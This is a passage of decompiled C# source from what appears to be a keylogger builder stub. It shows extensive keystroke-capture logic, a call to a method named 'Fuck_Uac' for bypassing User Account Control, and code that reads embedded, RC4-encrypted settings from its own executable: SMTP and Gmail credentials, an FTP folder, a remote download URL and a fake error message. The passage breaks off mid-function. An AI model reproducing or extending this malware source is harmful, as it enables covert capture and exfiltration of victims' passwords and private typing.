            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.NumPad0:
            this.TextBox1.Text += "0";
            break;
          case Keys.NumPad1:
            this.TextBox1.Text += "1";
            break;
          case Keys.NumPad2:
            this.TextBox1.Text += "2";
            break;
          case Keys.NumPad3:
            this.TextBox1.Text += "3";
            break;
          case Keys.NumPad4:
            this.TextBox1.Text += "4";
            break;
          case Keys.NumPad5:
            this.TextBox1.Text += "5";
            break;
          case Keys.NumPad6:
            this.TextBox1.Text += "6";
            break;
          case Keys.NumPad7:
            this.TextBox1.Text += "7";
            break;
          case Keys.NumPad8:
            this.TextBox1.Text += "8";
            break;
          case Keys.NumPad9:
            this.TextBox1.Text += "9";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else if (MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.D0:
            this.TextBox1.Text += ")";
            break;
          case Keys.D1:
            this.TextBox1.Text += "!";
            break;
          case Keys.D2:
            this.TextBox1.Text += "@";
            break;
          case Keys.D3:
            this.TextBox1.Text += "#";
            break;
          case Keys.D4:
            this.TextBox1.Text += "$";
            break;
          case Keys.D5:
            this.TextBox1.Text += "%";
            break;
          case Keys.D6:
            this.TextBox1.Text += "^";
            break;
          case Keys.D7:
            this.TextBox1.Text += "&";
            break;
          case Keys.D8:
            this.TextBox1.Text += "*";
            break;
          case Keys.D9:
            this.TextBox1.Text += "(";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ":";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += "<";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "_";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ">";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "?";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "~";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "{";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "|";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "}";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "a";
            break;
          case Keys.B:
            this.TextBox1.Text += "b";
            break;
          case Keys.C:
            this.TextBox1.Text += "c";
            break;
          case Keys.D:
            this.TextBox1.Text += "d";
            break;
          case Keys.E:
            this.TextBox1.Text += "e";
            break;
          case Keys.F:
            this.TextBox1.Text += "f";
            break;
          case Keys.G:
            this.TextBox1.Text += "g";
            break;
          case Keys.H:
            this.TextBox1.Text += "h";
            break;
          case Keys.I:
            this.TextBox1.Text += "i";
            break;
          case Keys.J:
            this.TextBox1.Text += "j";
            break;
          case Keys.K:
            this.TextBox1.Text += "k";
            break;
          case Keys.L:
            this.TextBox1.Text += "l";
            break;
          case Keys.M:
            this.TextBox1.Text += "m";
            break;
          case Keys.N:
            this.TextBox1.Text += "n";
            break;
          case Keys.O:
            this.TextBox1.Text += "o";
            break;
          case Keys.P:
            this.TextBox1.Text += "p";
            break;
          case Keys.Q:
            this.TextBox1.Text += "q";
            break;
          case Keys.R:
            this.TextBox1.Text += "r";
            break;
          case Keys.S:
            this.TextBox1.Text += "s";
            break;
          case Keys.T:
            this.TextBox1.Text += "t";
            break;
          case Keys.U:
            this.TextBox1.Text += "u";
            break;
          case Keys.V:
            this.TextBox1.Text += "v";
            break;
          case Keys.W:
            this.TextBox1.Text += "w";
            break;
          case Keys.X:
            this.TextBox1.Text += "x";
            break;
          case Keys.Y:
            this.TextBox1.Text += "y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else
      {
        if (!(MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock))
          return;
        if (Key == Keys.D1)
          this.TextBox1.Text += "!";
        else if (Key == Keys.D2)
          this.TextBox1.Text += "@";
        else if (Key == Keys.D3)
          this.TextBox1.Text += "#";
        else if (Key == Keys.D4)
          this.TextBox1.Text += "$";
        else if (Key == Keys.D5)
          this.TextBox1.Text += "%";
        else if (Key == Keys.D6)
          this.TextBox1.Text += "^";
        else if (Key == Keys.D7)
          this.TextBox1.Text += "&";
        else if (Key == Keys.D8)
          this.TextBox1.Text += "*";
        else if (Key == Keys.D9)
          this.TextBox1.Text += "(";
        else if (Key == Keys.D0)
          this.TextBox1.Text += ")";
        else if (Key == Keys.A)
          this.TextBox1.Text += "A";
        else if (Key == Keys.B)
          this.TextBox1.Text += "B";
        else if (Key == Keys.C)
          this.TextBox1.Text += "C";
        else if (Key == Keys.D)
          this.TextBox1.Text += "D";
        else if (Key == Keys.E)
          this.TextBox1.Text += "E";
        else if (Key == Keys.F)
          this.TextBox1.Text += "F";
        else if (Key == Keys.G)
          this.TextBox1.Text += "G";
        else if (Key == Keys.H)
          this.TextBox1.Text += "H";
        else if (Key == Keys.I)
          this.TextBox1.Text += "I";
        else if (Key == Keys.J)
          this.TextBox1.Text += "J";
        else if (Key == Keys.K)
          this.TextBox1.Text += "K";
        else if (Key == Keys.L)
          this.TextBox1.Text += "L";
        else if (Key == Keys.M)
          this.TextBox1.Text += "M";
        else if (Key == Keys.N)
          this.TextBox1.Text += "N";
        else if (Key == Keys.O)
          this.TextBox1.Text += "O";
        else if (Key == Keys.D2)
          this.TextBox1.Text += "@";
        else if (Key == Keys.P)
          this.TextBox1.Text += "P";
        else if (Key == Keys.Q)
          this.TextBox1.Text += "Q";
        else if (Key == Keys.R)
          this.TextBox1.Text += "R";
        else if (Key == Keys.S)
          this.TextBox1.Text += "S";
        else if (Key == Keys.T)
          this.TextBox1.Text += "T";
        else if (Key == Keys.U)
          this.TextBox1.Text += "U";
        else if (Key == Keys.V)
          this.TextBox1.Text += "V";
        else if (Key == Keys.W)
          this.TextBox1.Text += "W";
        else if (Key == Keys.X)
          this.TextBox1.Text += "X";
        else if (Key == Keys.Y)
          this.TextBox1.Text += "Y";
        else if (Key == Keys.Z)
          this.TextBox1.Text += "Z";
        else if (Key == Keys.Oemcomma)
          this.TextBox1.Text += "<";
        else if (Key == Keys.OemMinus)
          this.TextBox1.Text += "_";
        else if (Key == Keys.OemOpenBrackets)
          this.TextBox1.Text += "{";
        else if (Key == Keys.OemCloseBrackets)
          this.TextBox1.Text += "}";
        else if (Key == Keys.OemQuestion)
          this.TextBox1.Text += "?";
        else if (Key == Keys.OemPipe)
          this.TextBox1.Text += "|";
        else if (Key == Keys.OemSemicolon)
          this.TextBox1.Text += ":";
        else if (Key == Keys.OemPeriod)
          this.TextBox1.Text += ">";
        else if (Key == Keys.Oemtilde)
          this.TextBox1.Text += "~";
        else if (Key == Keys.Space)
          this.TextBox1.Text += " ";
        else if (Key == Keys.Return)
          this.TextBox1.Text += "\r\n";
        else if (Key == Keys.F1)
          this.TextBox1.Text += "[F1]";
        else if (Key == Keys.F2)
          this.TextBox1.Text += "[F2]";
        else if (Key == Keys.F3)
          this.TextBox1.Text += "[F3]";
        else if (Key == Keys.F4)
          this.TextBox1.Text += "[F4]";
        else if (Key == Keys.F5)
          this.TextBox1.Text += "[F5]";
        else if (Key == Keys.F6)
          this.TextBox1.Text += "[F6]";
        else if (Key == Keys.F7)
          this.TextBox1.Text += "[F7]";
        else if (Key == Keys.F8)
          this.TextBox1.Text += "[F8]";
        else if (Key == Keys.F9)
          this.TextBox1.Text += "[F9]";
        else if (Key == Keys.F10)
          this.TextBox1.Text += "[F10]";
        else if (Key == Keys.F11)
          this.TextBox1.Text += "[F11]";
        else if (Key == Keys.F12)
          this.TextBox1.Text += "[F12]";
        else if (Key == Keys.Delete)
          this.TextBox1.Text += "[DEL]";
        else if (Key == Keys.Back)
          this.TextBox1.Text += "[DEL]";
        else if (Key == Keys.Down)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Up)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Left)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Right)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Tab)
          this.TextBox1.Text += "[TAB]";
        else if (Key == Keys.End)
          this.TextBox1.Text += "[END]";
        else if (Key == Keys.Escape)
          this.TextBox1.Text += "[ESC]";
        else if (Key == Keys.Divide)
          this.TextBox1.Text += "/";
        else if (Key == Keys.Decimal)
          this.TextBox1.Text += ".";
        else if (Key == Keys.Subtract)
          this.TextBox1.Text += "-";
        else if (Key == Keys.Add)
        {
          this.TextBox1.Text += "+";
        }
        else
        {
          if (Key != Keys.Multiply)
            return;
          this.TextBox1.Text += "*";
        }
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.Fuck_Uac();
label_2:
        num3 = 3;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_3:
        num3 = 4;
        this.text1 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_4:
        num3 = 5;
        this.text2 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_5:
        num3 = 6;
        this.text3 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_6:
        num3 = 7;
        this.numberval = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_7:
        num3 = 8;
        this.smtpgmail = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_8:
        num3 = 9;
        this.ftpfolder = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_9:
        num3 = 10;
        this.smtp = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_10:
        num3 = 11;
        this.port = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_11:
        num3 = 12;
        this.skey = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_12:
        num3 = 13;
        this.cb1 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_13:
        num3 = 14;
        this.cb2 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_14:
        num3 = 15;
        this.cb3 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_15:
        num3 = 16;
        this.rdurl = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_16:
        num3 = 17;
        this.rdfilename = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_17:
        num3 = 18;
        this.cb4 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_18:
        num3 = 19;
        this.fakesub = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_19:
        num3 = 20;
        this.fakebody = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_20:
        num3 = 21;
        this.fakeerror = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_21:
        num3 = 22;
        this.cb6 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_22:
        num3 = 23;
        this.cb7 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_23:
        num3 = 24;
        this.cb8 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_24:
        num3 = 25;
        this.cb9 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_25:
        num3 = 26;
        this.cb11 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_26:
        num3 = 27;
        this.cb12 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_27:
        num3 = 28;
        this.cb13 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_28:
        num3 = 29;
        this.cb14 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_29:
        num3 = 30;
        this.cb15 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_30:
        num3 = 31;
        this.cb16 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_31:
        num3 = 32;
        this.cb17 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_32:
        num3 = 33;
        this.cb18 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_33:
        num3 = 34;
        this.cb19 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_34:
        num3 = 35;
        this.cb20 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_35:
        num3 = 36;
        this.cb21 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_36:
        num3 = 37;
        this.cb22 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_37:
        num3 = 38;
        this.sername = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_38:
        num3 = 39;
        this.cb5 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_39:
        num3 = 40;
        this.wlist = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_40:
        num3 = 41;
        this.cb23 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_41:
        num3 = 42;
        this.cb24 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_42:
        num3 = 43;
        this.cb25 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_43:
        num3 = 44;
        this.cb26 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_44:
        num3 = 45;
        this.cb27 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_45:
        num3 = 46;
        this.cb28 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_46:
        num3 = 47;
        this.cb29 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_47:
        num3 = 48;
        this.cb30 = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
label_48:
        num3 = 49;
        FileSystem.FileGet(1, ref this.text1);
label_49:
        num3 = 50;
        FileSystem.FileGet(1, ref this.text2);
label_50:
        num3 = 51;
        FileSystem.FileGet(1, ref this.text3);
label_51:
        num3 = 52;
        FileSystem.FileGet(1, ref this.numberval);
label_52:
        num3 = 53;
        FileSystem.FileGet(1, ref this.smtpgmail);
label_53:
        num3 = 54;
        FileSystem.FileGet(1, ref this.ftpfolder);
label_54:
        num3 = 55;
        FileSystem.FileGet(1, ref this.smtp);
label_55:
        num3 = 56;
        FileSystem.FileGet(1, ref this.port);
label_56:
        num3 = 57;
        FileSystem.FileGet(1, ref this.skey);
label_57:
        num3 = 58;
        FileSystem.FileGet(1, ref this.cb1);
label_58:
        num3 = 59;
        FileSystem.FileGet(1, ref this.cb2);
label_59:
        num3 = 60;
        FileSystem.FileGet(1, ref this.cb3);
label_60:
        num3 = 61;
        FileSystem.FileGet(1, ref this.rdurl);
label_61:
        num3 = 62;
        FileSystem.FileGet(1, ref this.rdfilename);
label_62:
        num3 = 63;
        FileSystem.FileGet(1, ref this.cb4);
label_63:
        num3 = 64;
        FileSystem.FileGet(1, ref this.fakesub);
label_64:
        num3 = 65;
        FileSystem.FileGet(1, ref this.fakebody);
label_65:
        num3 = 66;
        FileSystem.FileGet(1, ref this.fakeerror);
label_66:
        num3 = 67;
        FileSystem.FileGet(1, ref this.cb6);
label_67:
        num3 = 68;
        FileSystem.FileGet(1, ref this.cb7);
label_68:
        num3 = 69;
        FileSystem.FileGet(1, ref this.cb8);
label_69:
        num3 = 70;
        FileSystem.FileGet(1, ref this.cb9);
label_70:
        num3 = 71;
        FileSystem.FileGet(1, ref this.cb11);
label_71:
        num3 = 72;
        FileSystem.FileGet(1, ref this.cb12);
label_72:
        num3 = 73;
        FileSystem.FileGet(1, ref this.cb13);
label_73:
        num3 = 74;
        FileSystem.FileGet(1, ref this.cb14);
label_74:
        num3 = 75;
        FileSystem.FileGet(1, ref this.cb15);
label_75:
        num3 = 76;
        FileSystem.FileGet(1, ref this.cb16);
label_76:
        num3 = 77;
        FileSystem.FileGet(1, ref this.cb17);
label_77:
        num3 = 78;
        FileSystem.FileGet(1, ref this.cb18);
label_78:
        num3 = 79;
        FileSystem.FileGet(1, ref this.cb19);
label_79:
        num3 = 80;
        FileSystem.FileGet(1, ref this.cb20);
label_80:
        num3 = 81;
        FileSystem.FileGet(1, ref this.cb21);
label_81:
        num3 = 82;
        FileSystem.FileGet(1, ref this.cb22);
label_82:
        num3 = 83;
        FileSystem.FileGet(1, ref this.sername);
label_83:
        num3 = 84;
        FileSystem.FileGet(1, ref this.cb5);
label_84:
        num3 = 85;
        FileSystem.FileGet(1, ref this.wlist);
label_85:
        num3 = 86;
        FileSystem.FileGet(1, ref this.cb23);
label_86:
        num3 = 87;
        FileSystem.FileGet(1, ref this.cb24);
label_87:
        num3 = 88;
        FileSystem.FileGet(1, ref this.cb25);
label_88:
        num3 = 89;
        FileSystem.FileGet(1, ref this.cb26);
label_89:
        num3 = 90;
        FileSystem.FileGet(1, ref this.cb27);
label_90:
        num3 = 91;
        FileSystem.FileGet(1, ref this.cb28);
label_91:
        num3 = 92;
        FileSystem.FileGet(1, ref this.cb29);
label_92:
        num3 = 93;
        FileSystem.FileGet(1, ref this.cb30);
label_93:
        num3 = 94;
        FileSystem.FileClose(1);
label_94:
        num3 = 95;
        byte[] bytes = ResourceReader.ReadResource(Application.ExecutablePath);
label_95:
        num3 = 96;
        string Expression = Encoding.Default.GetString(bytes);
label_96:
        num3 = 97;
        string[] strArray = Microsoft.VisualBasic.Strings.Split(Expression, "@Rapid@");
label_97:
        num3 = 98;
        this.TextBox2.Text = strArray[1];
label_98:
        num3 = 99;
        this.TextBox3.Text = strArray[2];
label_99:
        num3 = 100;
        this.TextBox4.Text = strArray[3];
label_100:
        num3 = 101;
        this.Label1.Text = strArray[4];
label_101:
        num3 = 102;
        this.Label2.Text = strArray[5];
label_102:
        num3 = 103;
        this.Label3.Text = strArray[6];
label_103:
        num3 = 104;
        this.Label4.Text = strArray[7];
label_104:
        num3 = 105;
        this.Label5.Text = strArray[8];
label_105:
        num3 = 106;
        this.Label7.Text = strArray[9];
label_106:
        num3 = 107;
        if (!Conversions.ToBoolean(strArray[10]))
          goto label_111;
label_107:
        num3 = 108;
        this.Label6.Text = "encrypion-Ys";
label_108:
        num3 = 109;
        this.TextBox2.Text = Form1.RC4(this.TextBox2.Text, this.skey);
label_109:
        num3 = 110;
        this.TextBox3.Text = Form1.RC4(this.TextBox3.Text, this.skey);
label_110:
        num3 = 111;
